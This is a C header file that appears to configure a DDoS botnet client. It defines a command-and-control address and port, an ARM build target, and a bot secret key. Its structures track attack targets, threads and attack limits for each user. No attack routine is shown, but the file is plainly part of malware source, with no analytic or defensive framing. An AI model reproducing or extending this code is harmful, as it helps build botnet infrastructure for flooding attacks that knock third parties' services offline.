#ifndef CONFIG_H
#define CONFIG_H

#include <time.h>

// Network configuration
#define C2_ADDRESS "127.0.0.1"
#define C2_PORT 1337
#define ARCH_NAME "armv7l"

// Attack parameters structure
typedef struct {
    char *ip;
    int port;
    time_t end_time;
    int *stop_flag;
} attack_params_t;

// Bot configuration
#define MAX_USERS 100
#define MAX_ATTACKS_PER_USER 10
#define MAX_THREADS 200
#define BUFFER_SIZE 4096
#define BOT_SECRET_B64 "kZPUbHYdNYRDXBjbR4SeWvUfvD5Sc90wMrC8XGa2Z54="

// Individual attack tracking
typedef struct {
    int active;
    int stop;
    int thread_count;
} attack_info_t;

// User attack tracking
typedef struct {
    char username[64];
    int attack_count;
    time_t last_attack_time;
    attack_info_t attacks[MAX_ATTACKS_PER_USER];
} user_attack_t;

#endif
